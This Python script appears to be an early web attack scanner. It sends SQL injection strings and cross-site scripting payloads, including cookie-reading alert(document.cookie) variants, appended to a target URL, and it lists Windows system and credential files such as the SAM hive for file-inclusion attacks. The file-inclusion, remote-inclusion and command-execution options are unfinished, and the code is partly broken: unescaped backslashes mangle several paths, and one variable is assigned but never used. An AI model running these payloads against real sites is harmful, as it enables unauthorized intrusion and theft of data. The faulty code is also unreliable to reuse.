#!python3
import argparse, urllib.request, os, sys

sqli = ["'", "\"", "`", "and 1=0", "or 1=0", "' and 1=0", "' or 1=0", "\" and 1=0", "\" or 1=0", "`and 1=0", "` or 1=0"]
xss = ["'<SCRIPT>alert(0)</SCRIPT>#",
       "'<SCRIPT>alert(0)</SCRIPT>//",
        "';alert(String.fromCharCode(88,83,83))//",
       "\";alert(String.fromCharCode(88,83,83))//",
       "--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",
       "'';!--\"<XSS>=&{()}",
       "<IMG SRC=\"javascript:alert('XSS');\">",
       "<IMG SRC=javascript:alert('XSS')>",
       "<IMG SRC=JaVaScRiPt:alert('XSS')>",
       "<IMG SRC=`javascript:alert(\"Test, 'XSS'\")`>",
       "<a onmouseover=\"alert(document.cookie)\">xxs link</a>",
       "<a onmouseover=alert(document.cookie)>xxs link</a>",
       "<IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\">",
       "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>"]
lfi = ["C:\boot.ini",
        "C:\WINDOWS\win.ini",
        "C:\WINNT\win.ini",
        "C:\WINDOWS\Repair\SAM",
        "C:\WINDOWS\php.ini",
        "C:\WINNT\php.ini",
        "C:\Program Files\Apache Group\Apache\conf\httpd.conf",
        "C:\Program Files\Apache Group\Apache2\conf\httpd.conf",
        "C:\Program Files\\xampp\apache\conf\httpd.conf",
        "C:\php\php.ini",
        "C:\php5\php.ini",
        "C:\php4\php.ini",
        "C:\apache\php\php.ini",
        "C:\\xampp\apache\bin\php.ini",
        "C:\home2\bin\stable\apache\php.ini",
        "C:\home\bin\stable\apache\php.ini",
        "C:\Program Files\Apache Group\Apache\logs\access.log",
        "C:\Program Files\Apache Group\Apache\logs\error.log",
        "C:\WINDOWS\TEMP\\",
        "C\php\sessions\\",
        "C:\php5\sessions\\",
        "C:\php4\sessions\\"]
rfi = []
rce = []

def clearScreen():
    if sys.platform == 'win32':os.system('cls')
    else:os.system('clear')
    print('''
                         __        __   	 ____       ____
       ____  ____  _____/ /___  __/ /__ 	 )   \     /   (
      / __ \/ __ \/ ___/ __/ / / / / _ \	  )_  \_V_/  _(
     / / / / /_/ / /__/ /_/ /_/ / /  __/	    )__   __(   
    /_/ /_/\____/\___/\__/\__,_/_/\___/	               `-'
    ''')

def get():
    x = input("\n\t1. SQLi\n\t2. XSS\n\t3. LFI\n\t4. RFI\n\t5. RCE\n")
    if x=="1":
        for i in sqli:
            req = args.url + i

            with urllib.request.urlopen(req) as response:
                html = str(response.read())
            with open("sql_errors.txt", "r") as f:
                for line in f:
                    if line in html:
                        print("\nLikely vulnerble.")
                        break

    elif x=="2":
        for i in xss:
            req = args.url + i
            try:
                with urllib.request.urlopen(req) as response:
                   html = str(response.read())
                if i in html:
                    print("\nLikely vulnrable.")
                    break
            except Exception as e:
                print(type(e))
                print(e)
                print(html)
    elif x=="3":atk = lfi
    elif x=="4":atk = rfi
    elif x=="5":atk = rce

def post():
    print("POST functionality not yet developed.")

def cookie():
    print("COOKIE functionality not yet developed.")

parser = argparse.ArgumentParser()

parser.add_argument('-m', '--method', dest='method', help='get, post, or cookie', default='get')
parser.add_argument('-u', '--url', dest='url', help='url to target')
parser.add_argument('-p', '--parameter', dest='parameter', help='parameter to use')
parser.add_argument('-d', '--data', dest='data', help='data to use for post or cookie module', default=None)

args = parser.parse_args()

clearScreen()

if args.method.lower() == 'get':get()
elif args.method.lower() == 'post':post()
elif args.method.lower() == 'cookie':cookie()
